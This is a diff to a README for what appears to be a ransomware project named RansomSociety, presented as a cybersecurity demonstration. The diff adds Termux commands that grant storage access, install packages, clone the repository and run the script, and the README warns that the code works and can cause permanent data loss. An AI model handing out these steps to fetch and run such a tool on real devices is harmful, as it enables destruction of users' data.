@@ -6,6 +6,18 @@ This is a cybersecurity demonstration and study project inspired by the **fsocie
 
 ---
 
+# ONLY FOR TERMUX
+
+termux-setyup-storage
+pkg install termux-api
+pkg install python
+pkg install git
+git clone https://github.com/flexc037/RansomSociety.git
+cd RansomSociety
+python RansomSociety.py
+
+---
+
 ## ⚠️ SECURITY WARNING (HIGHLY DANGEROUS)
 
 * **REAL RISK:** This code is **extremely dangerous** and functional. If executed outside of a controlled environment, it can cause permanent data loss.
